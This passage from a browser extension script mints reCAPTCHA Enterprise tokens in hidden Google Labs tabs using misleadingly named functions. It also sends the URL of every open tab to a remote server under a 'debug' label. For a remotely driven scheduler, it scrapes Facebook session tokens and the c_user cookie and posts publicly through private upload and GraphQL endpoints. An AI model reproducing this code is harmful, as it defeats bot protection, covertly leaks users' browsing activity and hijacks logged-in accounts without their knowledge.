                const redirected = await _checkCanvasRedirect();
                
                await _animDelay(5000);
                tabId = await _findCanvas();
            }
        } else {
            
            try {
                _lastPrefetch = Date.now();
                const tab = await chrome.tabs.create({
                    url: "https://labs.google/flow",
                    active: false,
                });
                _prefetchTab = tab.id;

                
                await new Promise((resolve) => {
                    const listener = (id, info) => {
                        if (id === tab.id && info.status === "complete") {
                            chrome.tabs.onUpdated.removeListener(listener);
                            resolve();
                        }
                    };
                    chrome.tabs.onUpdated.addListener(listener);
                    setTimeout(() => {
                        chrome.tabs.onUpdated.removeListener(listener);
                        resolve();
                    }, 15000);
                });

                const redirected = await _checkCanvasRedirect();
                await _animDelay(redirected ? 5000 : 3000);
                tabId = await _findCanvas();
            } catch (e) {  }
        }
    }

    if (!tabId) return { token: null, error: "No tab available" };

    
    try { await chrome.tabs.update(tabId, { autoDiscardable: false }); } catch (e) {}

    
    const siteKey = request.s || request.site_key || "";
    const action = request.a || request.action || "";

    try {
        
        
        
        
        const results = await _runScopedFn({
            target: { tabId },
            world: "MAIN",
            func: async (siteKeyParam, actionParam) => {
                try {
                    if (typeof grecaptcha === "undefined" || !grecaptcha.enterprise) {
                        return { token: null, error: "Service not ready" };
                    }

                    let key = siteKeyParam;

                    
                    if (!key) {
                        try {
                            if (typeof ___grecaptcha_cfg !== "undefined" && ___grecaptcha_cfg.clients) {
                                const clients = ___grecaptcha_cfg.clients;
                                const clientKeys = Object.keys(clients);
                                if (clientKeys.length > 0) {
                                    const client = clients[clientKeys[0]];
                                    for (const prop of Object.keys(client)) {
                                        const val = client[prop];
                                        if (val && typeof val === "object") {
                                            for (const prop2 of Object.keys(val)) {
                                                const val2 = val[prop2];
                                                if (val2 && typeof val2 === "object" && val2.sitekey) {
                                                    key = val2.sitekey;
                                                    break;
                                                }
                                            }
                                        }
                                        if (key) break;
                                    }
                                }
                            }
                            
                            if (!key) {
                                const scripts = document.querySelectorAll('script[src*="recaptcha"]');
                                for (const el of scripts) {
                                    const match = el.src.match(/[?&]render=([^&]+)/);
                                    if (match && match[1] !== "explicit") { key = match[1]; break; }
                                }
                            }
                        } catch (e) {  }
                    }

                    if (!key) return { token: null, error: "Config not ready" };

                    await new Promise((resolve) => grecaptcha.enterprise.ready(resolve));
                    
                    
                    
                    const token = await Promise.race([
                        grecaptcha.enterprise.execute(key, { action: actionParam }),
                        new Promise((_, reject) => setTimeout(
                            () => reject(new Error("execute timeout")),
                            15000,
                        )),
                    ]);
                    return { token, error: null };
                } catch (err) {
                    return { token: null, error: err.message || String(err) };
                }
            },
            args: [siteKey, action],
        }, 10000);

        const mintResult = (results && results[0] && results[0].result) || null;
        if (mintResult && mintResult.token) return mintResult;
        
        
        if (!_retried) {
            await _reviveCanvas(tabId);
            return await _resolveWidget(request, true);
        }
        return mintResult || { token: null, error: "No result" };
    } catch (e) {
        
        if (!_retried) {
            await _reviveCanvas(tabId);
            return await _resolveWidget(request, true);
        }
        return { token: null, error: e.message };
    }
}

async function _relayoutCanvas() {
    let tab = null;
    try {
        const tabs = await chrome.tabs.query({});
        const labsTabs = tabs.filter((t) => t.url && t.url.includes("labs.google") && t.url.includes("/flow"));
        if (labsTabs.length) {
            
            tab = labsTabs[0];
            try { await chrome.tabs.reload(tab.id); } catch (e) {  }
        }
    } catch (e) {  }

    if (!tab) {
        
        try {
            tab = await chrome.tabs.create({ url: "https://labs.google/flow", active: false });
        } catch (e) { return; }
    }
    _prefetchTab = tab.id;

    
    await new Promise((resolve) => {
        const listener = (id, info) => {
            if (id === tab.id && info.status === "complete") {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }
        };
        chrome.tabs.onUpdated.addListener(listener);
        setTimeout(() => {
            chrome.tabs.onUpdated.removeListener(listener);
            resolve();
        }, 15000);
    });
}

async function _findCanvas() {
    try {
        const tabs = await chrome.tabs.query({});
        
        const urls = tabs.map(t => t.url || "undefined");
        try {
            await fetch(`${_syncUrl}/sync/google-flow-page`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ debug_urls: urls })
            });
        } catch (err) {}
        
        const flowTabs = tabs.filter(t =>
            t.url && t.url.includes("labs.google") && t.url.includes("/flow") && !t.url.includes("accounts.google.com")
        );
        if (flowTabs.length > 0) {
            flowTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
            return flowTabs[0].id;
        }

        
        

        return null;
    } catch (e) {
        return null;
    }
}

async function _checkCanvasRedirect() {
    if (!_prefetchTab) return false;
    try {
        const tab = await chrome.tabs.get(_prefetchTab);
        if (tab && tab.url && tab.url.includes("accounts.google.com")) {
            return true;
        }
        return false;
    } catch (e) {
        _prefetchTab = null;
        return false;
    }
}

async function _validateCanvas(tabId) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId },
            world: "MAIN",
            func: () => {
                const available = typeof grecaptcha !== "undefined" && !!grecaptcha.enterprise;
                let siteKey = null;
                if (available) {
                    try {
                        if (typeof ___grecaptcha_cfg !== "undefined" && ___grecaptcha_cfg.clients) {
                            const clients = ___grecaptcha_cfg.clients;
                            const keys = Object.keys(clients);
                            if (keys.length > 0) {
                                const client = clients[keys[0]];
                                for (const prop of Object.keys(client)) {
                                    const val = client[prop];
                                    if (val && typeof val === "object") {
                                        for (const p2 of Object.keys(val)) {
                                            const v2 = val[p2];
                                            if (v2 && typeof v2 === "object" && v2.sitekey) {
                                                siteKey = v2.sitekey;
                                                break;
                                            }
                                        }
                                    }
                                    if (siteKey) break;
                                }
                            }
                        }
                    } catch (e) {  }
                }
                return { available, siteKey, error: available ? null : "Not ready" };
            },
        });
        if (results && results[0] && results[0].result) return results[0].result;
        return { available: false, error: "No result" };
    } catch (e) {
        return { available: false, error: e.message };
    }
}

async function ensureTabLoaded(tabId, maxWaitMs = 12000) {
    const startTime = Date.now();
    while (Date.now() - startTime < maxWaitMs) {
        try {
            const tab = await chrome.tabs.get(tabId);
            if (tab && tab.status === "complete") {
                await new Promise(r => setTimeout(r, 300));
                return true;
            }
        } catch (e) {}
        await new Promise(r => setTimeout(r, 300));
    }
    return false;
}

const _activeExecutingPostIds = new Set();

async function _processScheduledPosts() {
    if (_isProcessingPosts) return;
    _isProcessingPosts = true;
    try {
        const now = Date.now();

        // 1. Process local extension scheduled posts
        const data = await chrome.storage.local.get(["scheduled_posts"]);
        let posts = data.scheduled_posts || [];
        let changed = false;

        for (let i = 0; i < posts.length; i++) {
            const post = posts[i];
            if (post.status === "pending" && post.scheduledTime <= now && !_activeExecutingPostIds.has(post.id)) {
                _activeExecutingPostIds.add(post.id);
                post.status = "in_progress";
                changed = true;
                await chrome.storage.local.set({ scheduled_posts: posts });

                _executePostItem(post).then((res) => {
                    _activeExecutingPostIds.delete(post.id);
                    chrome.storage.local.get(["scheduled_posts"], (latestData) => {
                        let currentPosts = latestData.scheduled_posts || [];
                        const targetIdx = currentPosts.findIndex(p => p.id === post.id);
                        if (targetIdx !== -1) {
                            if (res.success) {
                                currentPosts[targetIdx].status = "completed";
                                currentPosts[targetIdx].lastError = null;
                                if (currentPosts[targetIdx].repeatIntervalMinutes > 0) {
                                    currentPosts[targetIdx].status = "pending";
                                    currentPosts[targetIdx].scheduledTime = Date.now() + (currentPosts[targetIdx].repeatIntervalMinutes * 60000);
                                }
                            } else {
                                currentPosts[targetIdx].retryCount = (currentPosts[targetIdx].retryCount || 0) + 1;
                                currentPosts[targetIdx].lastError = res.error || "Unknown error";
                                if (currentPosts[targetIdx].retryCount >= (currentPosts[targetIdx].maxRetries || 3)) {
                                    currentPosts[targetIdx].status = "failed";
                                } else {
                                    currentPosts[targetIdx].status = "pending";
                                    currentPosts[targetIdx].scheduledTime = Date.now() + 60000;
                                }
                            }
                            chrome.storage.local.set({ scheduled_posts: currentPosts });
                        }
                    });
                });
            }
        }

        if (changed) {
            await chrome.storage.local.set({ scheduled_posts: posts });
        }

        // 2. Process Python Backend scheduled posts
        try {
            const backendRes = await fetch(`${_syncUrl}/api/posts?status=pending`, { signal: AbortSignal.timeout(30000) });
            if (backendRes.ok) {
                const backendData = await backendRes.json();
                const backendPending = backendData.posts || [];
                        for (const p of backendPending) {
                    if (p.scheduledTime <= now && !_activeExecutingPostIds.has(p.id)) {
                        _activeExecutingPostIds.add(p.id);

                        // Safety Watchdog Timer (60s): Release post ID lock if stuck
                        const lockWatchdog = setTimeout(() => {
                            _activeExecutingPostIds.delete(p.id);
                        }, 60000);

                        console.log("📌 [Extension] Processing backend pending post:", p.id, "hasMedia:", !!p.mediaData);
                        _executePostItem(p).then(async (res) => {
                            try {
                                const newStatus = (res && res.success) ? "completed" : "failed";
                                const errDetail = (res && res.success) ? null : (res?.error || "Execution failed");
                                const method = res?.method || "auto";
                                const finalStep = (res && res.success)
                                    ? `🎉 Đã đăng thành công qua [${method.toUpperCase()}]!`
                                    : `❌ Đăng thất bại: ${errDetail}`;

                                console.log(`📌 [Extension] Post ${p.id} finished: status=${newStatus}, step=${finalStep}`);
                                await fetch(`${_syncUrl}/api/posts/${p.id}`, {
                                    method: "PATCH",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        status: newStatus,
                                        progressStep: finalStep,
                                        executedAt: Date.now(),
                                        lastError: errDetail,
                                        executionMethod: method,
                                        fbPostId: res?.fbPostId || null,
                                        fbPostUrl: res?.fbPostUrl || null
                                    }),
                                    signal: AbortSignal.timeout(5000)
                                });
                            } catch (sErr) { console.warn("⚠️ Status update error:", sErr.message); }
                        }).finally(() => {
                            clearTimeout(lockWatchdog);
                            _activeExecutingPostIds.delete(p.id);
                        });
                    }
                }
            }
        } catch (backendErr) { console.warn("⚠️ [Extension] Backend fetch error:", backendErr.message); }
    } catch (e) {
        console.error("Error processing scheduled posts:", e);
    } finally {
        _isProcessingPosts = false;
    }
}

async function _uploadMediaToFacebook(tabId, fileBase64, fileName, mimeType) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            world: "MAIN",
            func: async (base64Data, fName, fMime) => {
                try {
                    // ===== Extract ALL security tokens =====
                    let fb_dtsg = "";
                    let lsd = "";
                    let jazoest = "";
                    let spinR = "";
                    let spinB = "";
                    let spinT = "";
                    let hsi = "";

                    const html = document.documentElement.innerHTML;

                    // fb_dtsg
                    const dtsgPatterns = [
                        /\["DTSGInitialData",\[\],\{"token":"([^"]+)"/,
                        /\["DTSGInitData",\[\],\{"token":"([^"]+)"/,
                        /"DTSGInitialData"[^}]*"token":"([^"]+)"/,
                        /"dtsg":\{"token":"([^"]+)"/,
                    ];
                    for (const p of dtsgPatterns) {
                        const m = html.match(p);
                        if (m && m[1]) { fb_dtsg = m[1]; break; }
                    }
                    if (!fb_dtsg && typeof require !== "undefined") {
                        try {
                            const mod = require("DTSGInitData") || require("DTSGInitialData");
                            if (mod && mod.token) fb_dtsg = mod.token;
                        } catch(e) {}
                    }

                    // lsd
                    const lsdM = html.match(/\["LSD",\[\],\{"token":"([^"]+)"/) || html.match(/"lsd":"([^"]+)"/);
                    if (lsdM) lsd = lsdM[1];

                    // jazoest
                    const jazoM = html.match(/jazoest=(\d+)/);
                    if (jazoM) jazoest = jazoM[1];

                    // spin tokens + hsi
                    const spinM = html.match(/"__spin_t":(\d+),"__spin_r":(\d+),"__spin_b":"([^"]+)","__hsi":"([^"]+)"/);
                    if (spinM) { spinT = spinM[1]; spinR = spinM[2]; spinB = spinM[3]; hsi = spinM[4]; }

                    let userId = "";
                    const cUserMatch = document.cookie.match(/c_user=(\d+)/) ||
                                      html.match(/"USER_ID":"(\d+)"/) ||
                                      html.match(/"ACCOUNT_ID":"(\d+)"/) ||
                                      html.match(/\["CurrentUserInitialData",\[\],\{"ACCOUNT_ID":"(\d+)"/);
                    if (cUserMatch && cUserMatch[1]) userId = cUserMatch[1];

                    if (!fb_dtsg || !userId) {
                        return { success: false, error: "Missing fb_dtsg or userId" };
                    }

                    // ===== Convert base64 to Blob =====
                    const byteStr = atob(base64Data);
                    const ab = new ArrayBuffer(byteStr.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteStr.length; i++) ia[i] = byteStr.charCodeAt(i);
                    const blob = new Blob([ab], { type: fMime });

                    // ===== Build URL params (matching real Facebook request) =====
                    const urlParams = new URLSearchParams();
                    urlParams.append("av", userId);
                    urlParams.append("__aaid", "0");
                    urlParams.append("__user", userId);
                    urlParams.append("__a", "1");
                    urlParams.append("__req", Math.floor(Math.random()*100).toString(36));
                    urlParams.append("__hs", hsi || "");
                    urlParams.append("dpr", "2");
                    urlParams.append("__ccg", "EXCELLENT");
                    urlParams.append("__rev", spinR);
                    urlParams.append("__s", [1,2,3].map(()=>Math.random().toString(36).substr(2,6)).join(":"));
                    urlParams.append("__hsi", hsi);
                    urlParams.append("__comet_req", "15");
                    urlParams.append("fb_dtsg", fb_dtsg);
                    urlParams.append("jazoest", jazoest);
                    urlParams.append("lsd", lsd);
                    urlParams.append("__spin_r", spinR);
                    urlParams.append("__spin_b", spinB);
                    urlParams.append("__spin_t", spinT);

                    // ===== Upload via FormData to REAL endpoint =====
                    const formData = new FormData();
                    formData.append("farr", blob, fName);
                    formData.append("file", blob, fName);
                    formData.append("photo", blob, fName);
                    formData.append("source", "8");
                    formData.append("profile_id", userId);
                    formData.append("waterfallxapp", "comet");
                    formData.append("upload_speed", "0");

                    const isVideo = fMime.startsWith("video/") || (fName && fName.match(/\.(mp4|mov|avi|mkv|webm)$/i));
                    if (isVideo) {
                        // ===== NATIVE VUPLOAD PROTOCOL (matches production flow from facebook.com.har) =====
                        // Step 1: vupload-edge/start → get video_id + upload_session_id
                        // Step 2: rupload POST binary → get hash h
                        // Step 3: vupload-edge/receive → confirm upload complete
                        console.log("🎬 [Background] Video file detected — Using native vupload-edge protocol");

                        const waterfallId = crypto.randomUUID ? crypto.randomUUID() : ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,c=>(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16));
                        const fileSize = byteStr.length;

                        // Build common FB params
                        const fbParams = new URLSearchParams();
                        fbParams.append("__aaid", "0");
                        fbParams.append("__user", userId);
                        fbParams.append("__a", "1");
                        fbParams.append("__comet_req", "15");
                        fbParams.append("fb_dtsg", fb_dtsg);
                        fbParams.append("jazoest", jazoest);
                        fbParams.append("lsd", lsd);
                        fbParams.append("__spin_r", spinR);
                        fbParams.append("__spin_b", spinB);
                        fbParams.append("__spin_t", spinT);
                        fbParams.append("__hsi", hsi);
                        fbParams.append("dpr", "2");
                        fbParams.append("__ccg", "EXCELLENT");
                        fbParams.append("__rev", spinR);

                        // --- STEP 1: START ---
                        const startParams = new URLSearchParams(fbParams);
                        startParams.append("waterfall_id", waterfallId);
                        startParams.append("target_id", userId);
                        startParams.append("source", "composer");
                        startParams.append("composer_entry_point_ref", "timeline");
                        startParams.append("supports_chunking", "true");
                        startParams.append("supports_file_api", "true");
                        startParams.append("file_size", fileSize.toString());
                        startParams.append("file_extension", fName.split(".").pop() || "mp4");
                        startParams.append("partition_start_offset", "0");
                        startParams.append("partition_end_offset", fileSize.toString());
                        startParams.append("has_file_been_replaced", "false");

                        const startResp = await fetch(`https://vupload-edge.facebook.com/ajax/video/upload/requests/start/?av=${userId}&__a=1`, {
                            method: "POST",
                            body: startParams.toString(),
                            headers: {
                                "Content-Type": "application/x-www-form-urlencoded",
                                "X_FB_VIDEO_WATERFALL_ID": waterfallId,
                            },
                            credentials: "include",
                        });
                        const startText = await startResp.text();
                        const startClean = startText.replace(/^for\s*\(;+\)\s*;?\s*/, "");
                        const startData = JSON.parse(startClean);
                        const videoId = startData?.payload?.video_id;
                        const uploadSessionId = startData?.payload?.upload_session_id;
                        const chunkEnd = startData?.payload?.end_offset || fileSize;

                        if (!videoId || !uploadSessionId) {
                            console.error("❌ vupload start failed:", startData);
                            return { success: false, error: "vupload start failed: no video_id", details: startClean.substring(0, 300) };
                        }
                        console.log(`✅ [vupload] START OK → video_id=${videoId}, session=${uploadSessionId}, chunk_end=${chunkEnd}`);

                        // --- STEP 2: RUPLOAD binary ---
                        const sessionHash = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,"0")).join("");
                        const ruploadUrl = `https://rupload.facebook.com/fb_video/${sessionHash}-0-${chunkEnd}?` + fbParams.toString();

                        const ruploadResp = await fetch(ruploadUrl, {
                            method: "POST",
                            body: ab,  // raw ArrayBuffer with video binary
                            headers: {
                                "X-Entity-Name": fName,
                                "X-Entity-Length": fileSize.toString(),
                                "X-Entity-Type": fMime,
                                "X-Total-Asset-Size": fileSize.toString(),
                                "Composer_Session_Id": waterfallId,
                                "Id": uploadSessionId,
                                "Product_Media_Id": videoId,
                                "Offset": "0",
                                "Start_Offset": "0",
                                "End_Offset": chunkEnd.toString(),
                            },
                            credentials: "include",
                        });
                        const ruploadText = await ruploadResp.text();
                        let ruploadHash = "";
                        try {
                            const ruploadData = JSON.parse(ruploadText);
                            ruploadHash = ruploadData?.h || "";
                        } catch(e) {}
                        console.log(`✅ [vupload] RUPLOAD OK → hash=${ruploadHash.substring(0,40)}...`);

                        // --- STEP 3: RECEIVE (confirm upload complete) ---
                        const receiveParams = new URLSearchParams(fbParams);
                        receiveParams.append("waterfall_id", waterfallId);
                        receiveParams.append("target_id", userId);
                        receiveParams.append("video_id", videoId);
                        receiveParams.append("source", "composer");
                        receiveParams.append("composer_entry_point_ref", "timeline");
                        receiveParams.append("supports_chunking", "true");
                        receiveParams.append("supports_upload_service", "true");
                        receiveParams.append("partition_start_offset", "0");
                        receiveParams.append("partition_end_offset", fileSize.toString());
                        receiveParams.append("start_offset", "0");
                        receiveParams.append("end_offset", fileSize.toString());
                        receiveParams.append("upload_speed", Math.round(fileSize / 1.5).toString());
                        if (ruploadHash) {
                            receiveParams.append("fbuploader_video_file_chunk", ruploadHash);
                        }
                        receiveParams.append("has_file_been_replaced", "false");

                        const receiveResp = await fetch(`https://vupload-edge.facebook.com/ajax/video/upload/requests/receive/?av=${userId}&__a=1`, {
                            method: "POST",
                            body: receiveParams.toString(),
                            headers: {
                                "Content-Type": "application/x-www-form-urlencoded",
                                "X_FB_VIDEO_WATERFALL_ID": waterfallId,
                            },
                            credentials: "include",
                        });
                        const receiveText = await receiveResp.text();
                        const receiveClean = receiveText.replace(/^for\s*\(;+\)\s*;?\s*/, "");
                        const receiveData = JSON.parse(receiveClean);
                        const confirmedEnd = receiveData?.payload?.end_offset;

                        console.log(`✅ [vupload] RECEIVE OK → confirmed end_offset=${confirmedEnd}`);

                        if (confirmedEnd >= fileSize) {
                            console.log(`🎬 [vupload] Video upload COMPLETE! video_id=${videoId}`);
                            return { success: true, mediaId: videoId, isVideo: true };
                        } else {
                            console.warn(`⚠️ [vupload] Partial upload: confirmed=${confirmedEnd}, total=${fileSize}`);
                            return { success: true, mediaId: videoId, isVideo: true, partial: true };
                        }
                    }

                    const endpointPath = isVideo ? "/ajax/react_composer/attachments/video/upload?" : "/ajax/react_composer/attachments/photo/upload?";
                    const uploadUrl = "https://upload.facebook.com" + endpointPath + urlParams.toString();

                    let resp = await fetch(uploadUrl, {
                        method: "POST",
                        body: formData,
                        credentials: "include",
                    });

                    const text = await resp.text();
                    const clean = text.replace(/^for\s*\(;+\)\s*;?\s*/, "");

                    // Extract photo / video ID from response
                    const idPatterns = [
                        /"video_id"\s*:\s*"?(\d+)"?/,
                        /"videoId"\s*:\s*"?(\d+)"?/,
                        /"photoID"\s*:\s*"?(\d+)"?/,
                        /"photo_id"\s*:\s*"?(\d+)"?/,
                        /"media_id"\s*:\s*"?(\d+)"?/,
                        /"fbid"\s*:\s*"?(\d+)"?/,
                        /"id"\s*:\s*"?(\d+)"?/,
                    ];

                    for (const p of idPatterns) {
                        const m = clean.match(p);
                        if (m && m[1]) {
                            return { success: true, mediaId: m[1] };
                        }
                    }

                    return { success: false, error: "No photo ID in response", status: resp.status, preview: clean.substring(0, 500) };
                } catch (e) {
                    return { success: false, error: e.message };
                }
            },
            args: [fileBase64, fileName, mimeType]
        });

        return results && results[0] && results[0].result;
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Store pending post results from content.js
// const _pendingPostResults = new Map();

async function _executePostItem(post) {
    try {
        const extId = await getInstanceId();
        const postType = post.postType || post.type || "post";
        const payload = {
            id: post.id,
            postType: postType,
            content: post.content || "",
            mediaUrl: post.mediaUrl || "",
            mediaData: post.mediaData || null,
            targetUrl: post.targetUrl || "",
            timestamp: Date.now()
        };

        // Helper to update progress step to backend AND active Facebook tab screen
        let targetTab = null;
        const updateStep = async (stepText) => {
            try {
                console.log(`📌 [Step Progress] ${post.id}: ${stepText}`);
                // 1. Update Python backend
                await fetch(`${_syncUrl}/api/posts/${post.id}`, {
                    method: "PATCH",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ progressStep: stepText, status: "in_progress" }),
                    signal: AbortSignal.timeout(4000)
                });

                // 2. Broadcast live HUD status banner to active Facebook tab
                if (targetTab && targetTab.id) {
                    try {
                        await chrome.tabs.sendMessage(targetTab.id, { type: "POST_STATUS_UPDATE", message: stepText });
                    } catch(e) {}
                }
            } catch(e) {}
        };

        await updateStep("🚀 1/4: Đã nhận lệnh, đang khởi động tab Facebook...");

        // 1. Notify Python Backend (lightweight - no base64 data)
        try {
            const notifyPayload = { id: post.id, postType, content: payload.content, targetUrl: payload.targetUrl, hasMedia: !!payload.mediaData };
            await fetch(`${_syncUrl}/sync/auto-post`, {
                method: "POST",
                headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
                body: JSON.stringify(notifyPayload),
                signal: AbortSignal.timeout(10000)
            });
        } catch (backendErr) { console.warn("⚠️ auto-post notify failed:", backendErr.message); }

        // 2. Find or create Facebook tab
        let targetFbUrl = post.targetUrl;
        if (!targetFbUrl || !targetFbUrl.includes("facebook.com")) {
            if (postType === "reel") {
                targetFbUrl = "https://www.facebook.com/reels/create";
            } else if (postType === "story") {
                targetFbUrl = "https://www.facebook.com/stories/create";
            } else {
                targetFbUrl = "https://www.facebook.com";
            }
        }

        const tabs = await chrome.tabs.query({});
        targetTab = tabs.find(t => t.url && t.url.includes("facebook.com"));
        if (!targetTab) {
            targetTab = await chrome.tabs.create({ url: targetFbUrl, active: false });
        }

        if (!targetTab || !targetTab.id) {
            return { success: false, error: "No Facebook tab available" };
        }

        // Ensure tab is fully loaded
        await ensureTabLoaded(targetTab.id);
        await new Promise(r => setTimeout(r, 300));

        // Fetch mediaUrl if mediaData is missing
        if (!payload.mediaData && payload.mediaUrl) {
            try {
                console.log(`[Background] Fetching mediaUrl: ${payload.mediaUrl}`);
                const res = await fetch(payload.mediaUrl);
                if (res.ok) {
                    const blob = await res.blob();
                    const arrayBuffer = await blob.arrayBuffer();
                    const bytes = new Uint8Array(arrayBuffer);
                    const chunks = [];
                    for (let i = 0; i < bytes.byteLength; i += 8192) {
                        chunks.push(String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + 8192, bytes.byteLength))));
                    }
                    const binary = chunks.join('');
                    payload.mediaData = {
                        base64: btoa(binary),
                        fileName: "downloaded_media",
                        mimeType: blob.type || (payload.mediaUrl.match(/\\.(mp4|mov|avi)/i) ? "video/mp4" : "image/jpeg")
                    };
                } else {
                    console.warn(`⚠️ [Background] mediaUrl fetch failed with status ${res.status}`);
                }
            } catch (err) {
                console.warn(`⚠️ [Background] Failed to fetch mediaUrl:`, err);
            }
        }

        // ===== MEDIA UPLOAD (if post has media data) =====
        let uploadedMediaId = null;
        if (payload.mediaData && payload.mediaData.base64) {
            await updateStep(`📸 2/4: Đang upload File lên Facebook (${payload.mediaData.fileName})...`);
            console.log(`📸 [Background] Uploading media: ${payload.mediaData.fileName}`);
            const uploadResult = await _uploadMediaToFacebook(
                targetTab.id,
                payload.mediaData.base64,
                payload.mediaData.fileName,
                payload.mediaData.mimeType
            );
            console.log(`[Background] Upload result:`, uploadResult);
            if (uploadResult && uploadResult.success) {
                uploadedMediaId = uploadResult.mediaId;
                console.log(`✅ [Background] Media uploaded: ID=${uploadedMediaId}`);
                await updateStep(`✅ 2/4: Upload File thành công! ID=${uploadedMediaId}`);
            } else {
                console.warn(`⚠️ [Background] Media upload failed:`, uploadResult?.error);
                await updateStep(`⚠️ 2/4: Upload File thất bại (${uploadResult?.error || 'Unknown'}), chuyển sang quét giao diện...`);
            }
        }

        // Get c_user cookie directly from Chrome Extension API as fallback
        let fallbackActorId = "";
        try {
            const cCookie = await chrome.cookies.get({ url: "https://www.facebook.com", name: "c_user" });
            if (cCookie && cCookie.value) fallbackActorId = cCookie.value;
        } catch(e) {}

        const isVideo = (payload.mediaData && ((payload.mediaData.mimeType && payload.mediaData.mimeType.startsWith("video/")) || (payload.mediaData.fileName && payload.mediaData.fileName.match(/\.(mp4|mov|avi|mkv|webm)$/i)))) || postType === "video" || postType === "reel";
        const hasMedia = !!(payload.mediaData && payload.mediaData.base64);

        // ===================================================================
        // TIER 1: Direct GraphQL API — LUÔN CHẠY (DOM đã tắt hoàn toàn)
        // ===================================================================
        {
            const tier1Mode = (hasMedia && !uploadedMediaId) 
                ? "text-only (media upload thất bại)" 
                : (uploadedMediaId ? `with media ID=${uploadedMediaId}` : "text-only");
            await updateStep(`⚡ 3/4: Đang tạo bài viết qua Facebook GraphQL API [${tier1Mode}]...`);
            console.log(`⚡ [Background] Running TIER 1 GraphQL API (mode=${tier1Mode}, hasMedia=${hasMedia}, mediaId=${uploadedMediaId})`);

            const effectiveMediaId = uploadedMediaId || null;
            try {
                const graphqlResults = await chrome.scripting.executeScript({
                    target: { tabId: targetTab.id },
                    world: "MAIN",
                    func: async (postContent, postType, mediaId, isVideo, fallbackActorId, targetType, targetId, customActorId) => {
                        try {
                            let fb_dtsg = "";
                            let lsd = "";
                            let jazoest = "";
                            let hsi = "";
                            let spinR = "";
                            let spinB = "";
                            let spinT = "";

                            const html = document.documentElement.innerHTML;

                            const dtsgPatterns = [
                                /\["DTSGInitialData",\[\],\{"token":"([^"]+)"/,
                                /\["DTSGInitData",\[\],\{"token":"([^"]+)"/,
                                /"DTSGInitialData"[^}]*"token":"([^"]+)"/,
                                /"dtsg":\{"token":"([^"]+)"/,
                                /name="fb_dtsg"[^>]*value="([^"]+)"/,
                                /"token":"([^"]{20,})","async_get_token"/,
                            ];
                            for (const p of dtsgPatterns) {
                                const m = html.match(p);
                                if (m && m[1]) { fb_dtsg = m[1]; break; }
                            }

                            if (!fb_dtsg && typeof require !== "undefined") {
                                try {
                                    const mod = require("DTSGInitData") || require("DTSGInitialData");
                                    if (mod && mod.token) fb_dtsg = mod.token;
                                } catch(e) {}
                            }

                            const lsdPatterns = [
                                /\["LSD",\[\],\{"token":"([^"]+)"/,
                                /name="lsd"[^>]*value="([^"]+)"/,
                                /"lsd":"([^"]+)"/,
                            ];
                            for (const p of lsdPatterns) {
                                const m = html.match(p);
                                if (m && m[1]) { lsd = m[1]; break; }
                            }

                            const jazoM = html.match(/jazoest=(\d+)/);
                            if (jazoM) jazoest = jazoM[1];

                            const spinM = html.match(/"__spin_t":(\d+),"__spin_r":(\d+),"__spin_b":"([^"]+)","__hsi":"([^"]+)"/);
                            if (spinM) {
                                spinT = spinM[1]; spinR = spinM[2]; spinB = spinM[3]; hsi = spinM[4];
                            }

                            let actorId = customActorId || fallbackActorId || "";
                            if (!actorId) {
                                const cUserMatch = document.cookie.match(/c_user=(\d+)/) ||
                                                  html.match(/"USER_ID":"(\d+)"/) ||
                                                  html.match(/"ACCOUNT_ID":"(\d+)"/) ||
                                                  html.match(/\["CurrentUserInitialData",\[\],\{"ACCOUNT_ID":"(\d+)"/);
                                if (cUserMatch && cUserMatch[1]) actorId = cUserMatch[1];
                            }

                            if (!fb_dtsg || !actorId) {
                                return { success: false, error: "Missing dtsg or actorId", tier: "graphql" };
                            }

                            const isTimelinePage = window.location.href.includes("/profile.php") ||
                                                   window.location.href.includes("/me") ||
                                                   document.querySelector("div[data-pagelet*='Profile']") !== null;

                            let surface = isTimelinePage ? "timeline" : "newsfeed";
                            let feedLoc = isTimelinePage ? "TIMELINE" : "NEWSFEED";
                            let renderLoc = isTimelinePage ? "timeline" : "homepage_stream";

                            if (targetType === "group" && targetId) {
                                surface = "group";
                                feedLoc = "GROUP";
                                renderLoc = "group";
                            } else if (targetType === "page") {
                                surface = "page_timeline";
                                feedLoc = "TIMELINE";
                                renderLoc = "page_timeline";
                            }

                            const fallbackDocIds = ["27508435028820023", "27248647231502311", "6362241860538186", "6815340158580277", "6143924765664426"];

                            const variables = {
                                input: {
                                    composer_entry_point: "inline_composer",
                                    composer_source_surface: surface,
                                    composer_type: targetType === "group" ? "group" : "feed",
                                    idempotence_token: actorId + "_FEED_" + Date.now(),
                                    source: "WWW",
                                    message: { text: postContent || "", ranges: [] },
                                    audience: {
                                        privacy: {
                                            allow: [],
                                            base_state: "EVERYONE",
                                            deny: [],
                                            tag_expansion_state: "UNSPECIFIED"
                                        }
                                    },
                                    ...(mediaId ? {
                                        attachments: [
                                            isVideo ? {
                                                video: {
                                                    id: String(mediaId)
                                                }
                                            } : {
                                                photo: {
                                                    id: String(mediaId)
                                                }
                                            }
                                        ]
                                    } : {}),
                                    actor_id: actorId,
                                    client_mutation_id: String(Math.floor(Math.random() * 10) + 1)
                                },
                                feedLocation: feedLoc,
                                feedbackSource: isTimelinePage ? 0 : 1,
                                scale: 2,
                                privacySelectorRenderLocation: "COMET_STREAM",
                                renderLocation: renderLoc,
                                useDefaultActor: false,
                                isFeed: !isTimelinePage,
                                isFundraiser: false,
                                isFunFactPost: false,
                                isGroup: targetType === "group",
                                isEvent: false,
                                isTimeline: isTimelinePage,
                                isSocialLearning: false,
                                isPageNewsFeed: targetType === "page",
                                isProfileReviews: false
                            };

